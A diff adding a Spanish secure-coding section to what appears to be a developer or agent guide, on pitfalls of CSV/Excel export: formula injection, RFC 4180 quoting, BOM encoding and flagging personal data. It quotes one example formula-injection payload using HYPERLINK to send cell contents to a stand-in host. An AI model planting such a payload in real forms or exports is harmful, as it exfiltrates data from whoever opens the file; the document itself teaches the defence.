@@ -183,6 +183,24 @@ permisos de borrado, aunque viva en un temporal y se ejecute una sola vez.
    invertida o expandir algo entre comillas, y entonces depuras un error que TÚ no escribiste.
    Escribe el script a un archivo y ejecuta el archivo.
 
+## Exportar datos a CSV / Excel (tres trampas, dos de ellas de seguridad)
+
+1. **Inyección de fórmulas (CWE-1236)** — la grave. Excel y Sheets INTERPRETAN un campo que empieza
+   por `=`, `+`, `-`, `@`, tabulador o CR. Si el dato viene de un formulario público, cualquiera
+   escribe `=HYPERLINK("http://malo/?d="&A1,"Ver")` en el campo «nombre» y eso se ejecuta al abrir el
+   export en la máquina de quien lo descarga, con SU sesión: es la vía clásica para exfiltrar una
+   hoja entera desde un input de una web. **Antepón un apóstrofo**, no borres el carácter — un
+   teléfono `+57 300…` es un dato legítimo que hay que conservar entero.
+2. **RFC 4180** — una coma, una comilla o un salto dentro de un campo parten la fila. Entrecomilla y
+   duplica la comilla interna. Un mensaje de usuario trae la coma de serie.
+3. **BOM** — sin `\uFEFF` al principio, Excel en Windows abre el archivo en la codificación del
+   sistema y los acentos salen rotos. No es cosmético si quien lo abre trabaja en Windows.
+4. **PII**: si el export lleva datos personales, **dilo en el nombre del archivo**. Nadie debería
+   encontrárselo en Descargas sin saber que son personas.
+5. Sepáralo en dos módulos: el serializador es **puro** (se prueba en Node, sin navegador) y la
+   descarga toca el DOM. Y `revokeObjectURL` después del clic — antes cancela la descarga; nunca, y
+   el archivo queda retenido en memoria mientras la pestaña siga abierta.
+
 ## Cuándo NO usar
 - Edits triviales sin consecuencias de diseño (un texto, un color, un typo).
 - Tareas que no son de código (salvo que haya una decisión de sistema detrás).
